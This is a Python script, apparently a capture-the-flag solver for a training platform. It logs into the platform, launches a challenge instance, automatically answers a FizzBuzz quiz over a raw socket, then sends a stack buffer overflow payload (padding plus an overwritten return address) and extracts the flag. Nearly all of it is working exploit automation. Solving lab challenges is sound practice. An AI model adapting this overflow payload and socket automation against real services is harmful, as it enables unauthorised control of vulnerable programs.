import sys, re, json, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab


def fizz(n):
    if n % 15 == 0:
        return "FizzBuzz"
    if n % 3 == 0:
        return "Fizz"
    if n % 5 == 0:
        return "Buzz"
    return str(n)


cy = CyLab(delay=0.4)
cy.login()
cy.req("PUT", "/api/challenges/181/instance/?source=library")
host = port = None
for _ in range(10):
    time.sleep(0.8)
    st, b = cy.req("GET", "/api/challenges/181/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m:
        host, port = m.group(2), int(m.group(3))
        break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=12)
s.settimeout(3)
buf = b""


def read_some(t=2.0):
    global buf
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(4096)
            if not c:
                break
            buf += c
            if buf.endswith(b"? ") or b"?" in buf[-6:]:
                break
        except socket.timeout:
            break
    txt = buf.decode("latin-1", "replace")
    buf = b""
    return txt


txt = read_some()
print("initial:", repr(txt[:120]))
answered = 0
for _ in range(120):
    m = re.search(r"(\d+)\?\s*$", txt)
    if not m:
        break
    n = int(m.group(1))
    ans = fizz(n)
    s.sendall(ans.encode() + b"\n")
    answered += 1
    txt = read_some(1.5)
    if answered % 20 == 0:
        print("  repondu a", answered, "| dernier prompt:", repr(txt[:60]))
print("total reponses:", answered)
print("apres le fizzbuzz:", repr(txt[:300]))
# etape suivante : proposer un payload de debordement
payload = b"A" * 103 + struct.pack("<I", 0x8049206)
s.sendall(payload + b"\n")
time.sleep(0.8)
out = b""
t0 = time.time()
while time.time() - t0 < 4:
    try:
        c = s.recv(4096)
        if not c:
            break
        out += c
    except socket.timeout:
        break
txt2 = out.decode("latin-1", "replace")
print("final:", repr(txt2[:300]))
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt2)
print("FLAG:", m.group(0) if m else None)
s.close()
